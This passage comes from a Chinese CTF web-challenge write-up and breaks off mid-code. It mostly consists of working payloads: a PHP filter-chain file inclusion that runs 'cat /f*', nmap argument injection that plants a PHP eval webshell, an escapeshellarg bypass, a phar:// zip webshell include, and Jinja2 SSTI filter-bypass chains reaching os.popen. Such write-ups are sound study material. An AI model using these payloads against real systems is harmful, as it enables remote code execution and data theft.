class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs coq">通用文件包含<br>?file=php://filter/convert.iconv.UTF8.CSISO2022KR|<span class="hljs-type">convert</span>.base64-<br>encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.UTF8.UTF16|<span class="hljs-type">convert</span>.iconv.WINDOWS-<br><span class="hljs-number">1258.</span>UTF32LE|<span class="hljs-type">convert</span>.iconv.ISIRI3342.ISO-IR<span class="hljs-number">-157</span>|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-<br>encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.ISO2022KR.UTF16|<span class="hljs-type">convert</span>.iconv.L6.UCS2|<span class="hljs-type">conver</span><br>t.base64-decode|<span class="hljs-type">convert</span>.base64-<br>encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.INIS.UTF16|<span class="hljs-type">convert</span>.iconv.CSIBM1133.IBM943|<span class="hljs-type">co</span><br>nvert.iconv.IBM932.SHIFT_JISX0213|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-<br>encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.CP367.UTF-<br><span class="hljs-number">16</span>|<span class="hljs-type">convert</span>.iconv.CSIBM901.SHIFT_JISX0213|<span class="hljs-type">convert</span>.iconv.UHC.CP1361|<span class="hljs-type">convert</span>.base64-<br>decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.INIS.UTF16|<span class="hljs-type">convert</span>.iconv.CSIBM1133.IBM943|<span class="hljs-type">co</span><br>nvert.iconv.GBK.BIG5|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-<br>encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.CP861.UTF-<br><span class="hljs-number">16</span>|<span class="hljs-type">convert</span>.iconv.L4.GB13000|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-<br>encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv<span class="hljs-number">.865</span>.UTF16|<span class="hljs-type">convert</span>.iconv.CP901.ISO6937|<span class="hljs-type">conver</span><br>t.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.SE2.UTF-<br><span class="hljs-number">16</span>|<span class="hljs-type">convert</span>.iconv.CSIBM1161.IBM<span class="hljs-number">-932</span>|<span class="hljs-type">convert</span>.iconv.MS932.MS936|<span class="hljs-type">convert</span>.base64-<br>decode|<span class="hljs-type">convert</span>.base64-<br>encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.INIS.UTF16|<span class="hljs-type">convert</span>.iconv.CSIBM1133.IBM943|<span class="hljs-type">co</span><br>nvert.base64-decode|<span class="hljs-type">convert</span>.base64-<br>encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.CP861.UTF-<br><span class="hljs-number">16</span>|<span class="hljs-type">convert</span>.iconv.L4.GB13000|<span class="hljs-type">convert</span>.iconv.BIG5.JOHAB|<span class="hljs-type">convert</span>.base64-<br>decode|<span class="hljs-type">convert</span>.base64-<br>encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.UTF8.UTF16LE|<span class="hljs-type">convert</span>.iconv.UTF8.CSISO2022KR<br>|<span class="hljs-type">convert</span>.iconv.UCS2.UTF8|<span class="hljs-type">convert</span>.iconv<span class="hljs-number">.8859</span>_3.UCS2|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-<br>encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.PT.UTF32|<span class="hljs-type">convert</span>.iconv.KOI8-U.IBM-<br><span class="hljs-number">932</span>|<span class="hljs-type">convert</span>.iconv.SJIS.EUCJP-WIN|<span class="hljs-type">convert</span>.iconv.L10.UCS4|<span class="hljs-type">convert</span>.base64-<br>decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.CP367.UTF-<br><span class="hljs-number">16</span>|<span class="hljs-type">convert</span>.iconv.CSIBM901.SHIFT_JISX0213|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-<br>encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.PT.UTF32|<span class="hljs-type">convert</span>.iconv.KOI8-U.IBM-<br><span class="hljs-number">932</span>|<span class="hljs-type">convert</span>.iconv.SJIS.EUCJP-WIN|<span class="hljs-type">convert</span>.iconv.L10.UCS4|<span class="hljs-type">convert</span>.base64-<br>decode|<span class="hljs-type">convert</span>.base64-<br>encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.UTF8.CSISO2022KR|<span class="hljs-type">convert</span>.base64-<br>decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.CP367.UTF<span class="hljs-number">-16</span>|<span class="hljs-type">convert</span>.iconv.CSIBM901.SHIFT_JISX0213|<span class="hljs-type">convert</span>.iconv.UHC.CP1361|<span class="hljs-type">convert</span>.base64-<br>decode|<span class="hljs-type">convert</span>.base64-<br>encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.CSIBM1161.UNICODE|<span class="hljs-type">convert</span>.iconv.ISO-IR-<br><span class="hljs-number">156.</span>JOHAB|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-<br>encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.ISO2022KR.UTF16|<span class="hljs-type">convert</span>.iconv.L6.UCS2|<span class="hljs-type">conver</span><br>t.base64-decode|<span class="hljs-type">convert</span>.base64-<br>encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.INIS.UTF16|<span class="hljs-type">convert</span>.iconv.CSIBM1133.IBM943|<span class="hljs-type">co</span><br>nvert.iconv.IBM932.SHIFT_JISX0213|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-<br>encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.SE2.UTF<span class="hljs-number">-16</span>|<span class="hljs-type">convert</span>.iconv.CSIBM1161.IBM-<br><span class="hljs-number">932</span>|<span class="hljs-type">convert</span>.iconv.MS932.MS936|<span class="hljs-type">convert</span>.iconv.BIG5.JOHAB|<span class="hljs-type">convert</span>.base64-<br>decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.base64-<br>decode/resource=php://temp&amp;<span class="hljs-number">0</span>=cat%<span class="hljs-number">20</span>/f*<br>#此步来源于https://www.cnblogs.com/mumuhhh/articles/<span class="hljs-number">17860683.</span>html<br></code></pre></td></tr></table></figure><h3 id="scan-tool"><a href="#scan-tool" class="headerlink" title="scan_tool"></a>scan_tool</h3><p>感觉像拼接命令执行，类似ping题，但是，好像被过滤了，直接搜CTF nmap</p><p>搜到一道相似的[网鼎杯]2020朱雀组的Nmap，用他们的payload打，但是打不出，一堆参数都被过滤了，后缀php也被过滤了</p><p>此处顺便记录一下写马的payload</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">&#x27; </span><span class="language-php"><span class="hljs-meta">&lt;?=</span> <span class="hljs-keyword">echo</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;a&quot;</span>]);<span class="hljs-meta">?&gt;</span></span><span class="language-xml"> -oG coleak.phtml &#x27; //写马</span><br><span class="language-xml">127.0.0.1&#x27; -iL /flag -o coleak                      //写入文件，然后直接访问</span><br></code></pre></td></tr></table></figure><p>换种方式，查看有关这个的相关函数<strong>escapeshellarg</strong>和<strong>escapeshellcmd</strong></p><p>然后继续搜，搜到有一篇博客说如果escapeshellarg 和 escapeshellcmd 在输入非ASCII 的字符时，会直接被忽略。</p><p>于是在命令参数中间夹杂中文字符，最终payload:</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">127.0.0.1</span>&#x27; -i我L /flag -o我N <span class="hljs-number">1</span>.phtml &#x27;   //这里oG没打出来，不懂，oN打出来了<br></code></pre></td></tr></table></figure><h3 id="famale-imp-l0ve"><a href="#famale-imp-l0ve" class="headerlink" title="famale_imp_l0ve"></a>famale_imp_l0ve</h3><p>考点: phar伪协议读zip文件</p><p>打开题目，文件上传，发现只能上传zip</p><p>F12发现include.php,用来文件包含</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//o2takuXX师傅说有问题，忘看了。</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Type: text/html; charset=utf-8&#x27;</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$file</span>) &amp;&amp; <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$file</span>, -<span class="hljs-number">4</span>)) == <span class="hljs-string">&quot;.jpg&quot;</span>)&#123;<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>写一个一句话木马，然后压缩为zip，然后上传，然后phar伪协议读文件，zip协议也可以</p><p>payload</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?file=phar:<span class="hljs-regexp">//u</span>pload<span class="hljs-regexp">/a.zip/</span>a.jpg<br></code></pre></td></tr></table></figure><h3 id="klf-2"><a href="#klf-2" class="headerlink" title="klf_2"></a>klf_2</h3><p>payload:</p><figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs twig"><span class="language-xml">http://qkxc2u105bpv62hkormtdb5oc.node.game.sycsec.com/secr3ttt?klf=</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> b=dict(po=<span class="hljs-number">1</span>,p=<span class="hljs-number">2</span>)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span><span class="hljs-template-tag">%&#125;</span><span class="language-xml">#用于提取字符串中的某个字符，用法pop(5)</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> line=(lipsum<span class="hljs-punctuation">|</span>string<span class="hljs-punctuation">|</span>list)<span class="hljs-punctuation">|</span>attr(b)(<span class="hljs-number">18</span>) <span class="hljs-template-tag">%&#125;</span><span class="language-xml"> #通过lipsum来获取单个下划线</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> towline=(line,line)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span> <span class="hljs-template-tag">%&#125;</span><span class="language-xml"> #下划线组合成两个下划线</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> glbs=((towline,dict(glo=<span class="hljs-number">1</span>,bals=<span class="hljs-number">2</span>)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span>)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span>,towline)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span><span class="hljs-template-tag">%&#125;</span><span class="language-xml">#dict合成__globals__关键字</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> gtitem=(towline,dict(ge=<span class="hljs-number">1</span>,titem=<span class="hljs-number">2</span>)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span>,towline)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span><span class="hljs-template-tag">%&#125;</span><span class="language-xml"> #dict合成__getitem__关键字</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> pp=dict(po=a,pen=<span class="hljs-number">2</span>)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span><span class="hljs-template-tag">%&#125;</span><span class="language-xml"> #dict合成popen关键字</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> oo=dict(o=a,s=b)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span><span class="hljs-template-tag">%&#125;</span><span class="language-xml">  #os</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> rd=dict(re=<span class="hljs-number">1</span>,ad=<span class="hljs-number">2</span>)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span><span class="hljs-template-tag">%&#125;</span><span class="language-xml"> #read </span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> kg=lipsum<span class="hljs-punctuation">|</span>string<span class="hljs-punctuation">|</span>list<span class="hljs-punctuation">|</span>attr(b)(<span class="hljs-number">9</span>)<span class="hljs-template-tag">%&#125;</span><span class="language-xml"> #获取空格</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> bult=(towline,dict(bui=<span class="hljs-number">1</span>,ltins=<span class="hljs-number">2</span>)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span>,towline)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span><span class="hljs-template-tag">%&#125;</span><span class="language-xml"> #获取__builtins__</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> ch=dict(ch=<span class="hljs-number">1</span>,r=<span class="hljs-number">2</span>)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span><span class="hljs-template-tag">%&#125;</span><span class="language-xml"> #获取chr字符串，因为特殊符号斜杠被过滤了，这里只能使用chr来创建 </span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> gt=dict(get=a)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span><span class="hljs-template-tag">%&#125;</span><span class="language-xml"> #get</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> cha=(lipsum<span class="hljs-punctuation">|</span>attr(glbs))<span class="hljs-punctuation">|</span>attr(gt)(bult)<span class="hljs-punctuation">|</span>attr(gt)(ch)<span class="hljs-template-tag">%&#125;</span><span class="language-xml"> #创建chr函数</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> sv=lipsum<span class="hljs-punctuation">|</span>string<span class="hljs-punctuation">|</span>list<span class="hljs-punctuation">|</span>attr(b)(<span class="hljs-number">36</span>)<span class="hljs-template-tag">%&#125;</span><span class="language-xml">  #获取数字7，因为斜杠\的ascii是47，这里7是会被检测</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> f=<span class="hljs-number">4</span><span class="hljs-template-tag">%&#125;</span><span class="language-xml"> #获取4</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> ap=dict(ap=<span class="hljs-number">1</span>,p=<span class="hljs-number">2</span>)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span><span class="hljs-template-tag">%&#125;</span><span class="language-xml"> #flag在/app路由下</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> n=(f,sv)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span><span class="hljs-punctuation">|</span>int<span class="hljs-template-tag">%&#125;</span><span class="language-xml"> #组成47的数字，这个int有必要</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> fl=dict(f=<span class="hljs-number">1</span>,l=<span class="hljs-number">2</span>)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span><span class="hljs-template-tag">%&#125;</span><span class="language-xml"> </span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> gg=(f,dict(g=<span class="hljs-number">1</span>)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span>)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span><span class="hljs-template-tag">%&#125;</span><span class="language-xml">  #flag的名字叫 fl4gfl4gfl4g</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> fg=(fl,gg,fl,gg,fl,gg)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span><span class="hljs-template-tag">%&#125;</span><span class="language-xml">  #这连着的三个应该可以优化</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> shell=((dict(ca=<span class="hljs-number">1</span>,t=<span class="hljs-number">2</span>)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span>,kg,cha(n))<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span>,ap,cha(n),fg)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span><span class="hljs-template-tag">%&#125;</span><span class="language-xml">#cat /app/fl4gfl4gfl4g</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;lipsum<span class="hljs-punctuation">|</span>attr(glbs)<span class="hljs-punctuation">|</span>attr(gtitem)(oo)<span class="hljs-punctuation">|</span>attr(pp)(shell)<span class="hljs-punctuation">|</span>attr(rd)()&#125;&#125;</span><span class="language-xml">  #执行完</span><br><span class="language-xml"></span><br></code></pre></td></tr></table></figure><p>好用的构造</p><figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs twig"><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> po=dict(po=<span class="hljs-number">1</span>,p=<span class="hljs-number">2</span>)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span>()<span class="hljs-template-tag">%&#125;</span><span class="language-xml">  #po=pop</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> a=(()<span class="hljs-punctuation">|</span>select<span class="hljs-punctuation">|</span>string<span class="hljs-punctuation">|</span>list)<span class="hljs-punctuation">|</span>attr(po)(<span class="hljs-number">24</span>)<span class="hljs-template-tag">%&#125;</span><span class="language-xml">  #_</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> oo=dict(o=a,s=a)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span>()<span class="hljs-template-tag">%&#125;</span><span class="language-xml">   #os</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> p=dict(po=a,pen=a)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span>()<span class="hljs-template-tag">%&#125;</span><span class="language-xml">  #popen</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> ch=dict(ch=a,r=a)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span>()<span class="hljs-template-tag">%&#125;</span><span class="language-xml">  #chr</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> <span class="hljs-keyword">in</span>=(a,a,dict(<span class="hljs-keyword">in</span>=a,it=a)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span>,a,a)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span>()<span class="hljs-template-tag">%&#125;</span><span class="language-xml">  #__init__</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> gl=(a,a,dict(glob=a,als=q)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span>,a,a)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span>()<span class="hljs-template-tag">%&#125;</span><span class="language-xml">  #__globals__</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> ge=(a,a,dict(geti=a,tem=a)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span>,a,a)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span>()<span class="hljs-template-tag">%&#125;</span><span class="language-xml">  #__getitem__</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> bu=(a,a,dict(bui=a,ltins=a)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span>,a,a)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span>()<span class="hljs-template-tag">%&#125;</span><span class="language-xml"> #__builtins__</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> im=(a,a,dict(imp=a,ort=a)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span>,a,a)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span>()<span class="hljs-template-tag">%&#125;</span><span class="language-xml"> #__import__</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> cl=(a,a,dict(cla=a,ss=a)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span>,a,a)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span>()<span class="hljs-template-tag">%&#125;</span><span class="language-xml"> #__class__</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> su=(a,a,dict(subcla=a,sses=a)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span>,a,a)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span>()<span class="hljs-template-tag">%&#125;</span><span class="language-xml">  #__subclasses__</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> ba=(a,a,dict(ba=a,se=a)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span>,a,a)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span>()<span class="hljs-template-tag">%&#125;</span><span class="language-xml">  #__base__</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> x=jay<span class="hljs-number">17</span><span class="hljs-punctuation">|</span>attr(cl)<span class="hljs-punctuation">|</span>attr(ba)<span class="hljs-punctuation">|</span>attr(su)()<span class="hljs-template-tag">%&#125;</span><span class="language-xml">  #jay17.__class__.__base__.__subclasses__()</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> chhr=()<span class="hljs-punctuation">|</span>attr(cl)<span class="hljs-punctuation">|</span>attr(ba)<span class="hljs-punctuation">|</span>attr(su)()<span class="hljs-punctuation">|</span>attr(ge)(<span class="hljs-number">117</span>)<span class="hljs-punctuation">|</span>attr(<span class="hljs-keyword">in</span>)<span class="hljs-punctuation">|</span>attr(gl)<span class="hljs-punctuation">|</span>attr(ge)(bu)<span class="hljs-punctuation">|</span>attr(ge)(ch)<span class="hljs-template-tag">%&#125;</span><span class="language-xml">  #利用os类提取chr函数，用于字符串拼接</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> pp=()<span class="hljs-punctuation">|</span>attr(cl)<span class="hljs-punctuation">|</span>attr(ba)<span class="hljs-punctuation">|</span>attr(su)()<span class="hljs-punctuation">|</span>attr(ge)(<span class="hljs-number">117</span>)<span class="hljs-punctuation">|</span>attr(<span class="hljs-keyword">in</span>)<span class="hljs-punctuation">|</span>attr(gl)<span class="hljs-punctuation">|</span>attr(ge)(p)<span class="hljs-template-tag">%&#125;</span><span class="language-xml">  #利用os类提取popen函数，用于字符串拼接</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> re=dict(re=a,ad=a)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span>()<span class="hljs-template-tag">%&#125;</span><span class="language-xml">   #read</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> en=dict(en=a,v=a)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span>()<span class="hljs-template-tag">%&#125;</span><span class="language-xml">  #env</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> fl=dict(fl=a,ag=a)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span>()<span class="hljs-template-tag">%&#125;</span><span class="language-xml">   #flag</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> ta=dict(ta=a,c=a)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span>()<span class="hljs-template-tag">%&#125;</span><span class="language-xml">   #ta</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> kgxg=(chhr(<span class="hljs-number">3</span>２),chhr(<span class="hljs-number">4</span>７))<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span>()<span class="hljs-template-tag">%&#125;</span><span class="language-xml">   #空格/,用的是全角,不能完全全角,也可以自己构造。</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> tf=(ta,kgxg,fl)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span>()<span class="hljs-template-tag">%&#125;</span><span class="language-xml">   #tac /flag</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> ll=dict(l=a,s=a)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span>()<span class="hljs-template-tag">%&#125;</span><span class="language-xml">   #ls</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> lll=(ll,kgxg)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span>()<span class="hljs-template-tag">%&#125;</span><span class="language-xml">   #ls /</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> la=(ll,kgxg,dict(ap=a,p=a)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span>)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span>()<span class="hljs-template-tag">%&#125;</span><span class="language-xml"> #ls /app</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> ha=dict(ha=a,hahaha=a)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span>()<span class="hljs-template-tag">%&#125;</span><span class="language-xml">   #hahahaha</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> th=(ta,chhr(<span class="hljs-number">3</span>２),ha)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span>()<span class="hljs-template-tag">%&#125;</span><span class="language-xml">   #tac hahahaha</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> tff=(ta,kgxg,ff)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span>()<span class="hljs-template-tag">%&#125;</span><span class="language-xml"> </span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> ym=(dict(ca=a,t=a)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span>,chhr(<span class="hljs-number">3</span>２),dict(ap=a,p=a)<span class="hljs-punctuation">|</span><span 